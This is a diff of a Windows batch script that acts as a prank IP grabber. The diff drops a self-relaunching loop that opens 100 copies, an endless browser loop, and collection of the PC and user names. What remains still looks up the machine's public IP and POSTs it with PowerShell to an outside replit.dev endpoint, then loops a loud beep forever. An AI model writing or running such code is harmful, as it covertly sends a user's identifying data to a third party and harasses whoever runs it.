@@ -5,48 +5,22 @@ pause
 
 setlocal
 
-rem Number of instances to open
-set "num_instances=100"
-
-rem Path to this batch file
-set "batch_path=%~f0"
-
-rem URL to open
-set "url=https://github.com/DJ-PAIN"
-
 rem POST URL
 set "post_url=https://4f9236a2-fac6-4fb2-8697-4d1dee369a19-00-2fizj8y2ymee8.picard.replit.dev/post"
 
 rem Function to get the IP address
 for /f "tokens=2 delims=[]" %%A in ('powershell -command "(Invoke-WebRequest -Uri http://api.ipify.org).Content"') do set "ip_address=%%A"
 
-rem Get PC Name and Windows User Name
-set "pc_name=%COMPUTERNAME%"
-set "user_name=%USERNAME%"
-
-rem Send POST request with IP, PC Name, and User Name
+rem Send POST request with IP
 powershell -Command ^
-    $data = @{ ip_address = "%ip_address%"; pc_name = "%pc_name%"; user_name = "%user_name%" } | ConvertTo-Json; ^
+    $data = @{ ip_address = "%ip_address%" } | ConvertTo-Json; ^
     Invoke-RestMethod -Uri "%post_url%" -Method Post -Body $data -ContentType "application/json"
 
-rem Open multiple instances of this batch file
-for /L %%i in (1,1,%num_instances%) do (
-    start "" "%batch_path%"
-)
-
-rem Function to pause for a specific duration in milliseconds
+rem Play a loud annoying sound using PowerShell
 set "delay=200"
 
-rem Play a loud annoying sound using PowerShell
 :play_sound
 powershell -Command ^
     (New-Object -ComObject WScript.Shell).Beep(1000, 1000) # Beep at 1000 Hz for 1 second
 timeout /t 2 /nobreak >nul
 goto play_sound
-
-rem Open the URL in the default web browser
-:open_url
-start "" "%url%"
-echo Opened %url%
-powershell -Command "Start-Sleep -Milliseconds %delay%"
-goto open_url
